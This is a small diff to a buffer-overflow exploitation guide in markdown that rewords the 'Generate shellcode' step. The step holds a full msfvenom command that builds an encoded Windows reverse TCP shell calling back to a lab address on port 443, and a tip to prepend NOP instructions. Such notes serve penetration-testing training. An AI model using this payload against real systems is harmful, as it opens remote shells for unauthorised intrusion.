@@ -113,13 +113,10 @@ Choose one of the pointers -> copy its address -> click on "Go to address in Dis
 
 ### 7. GENERATE SHELLCODE
 
-Generate shellcode:  
+Generate shellcode and add it to the BOF exploit code. 
 `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
 
-Add shellcode to the BOF exploit code.
-
-Provide the shellcode decoder some stack-space to work with
-* `"\x90 * 16"`: Append NOP instructions to the front of the payload `
+Provide the shellcode decoder some stack-space to work with: `"\x90 * 16"` Append NOP instructions to the front of the payload
 
 ---
 
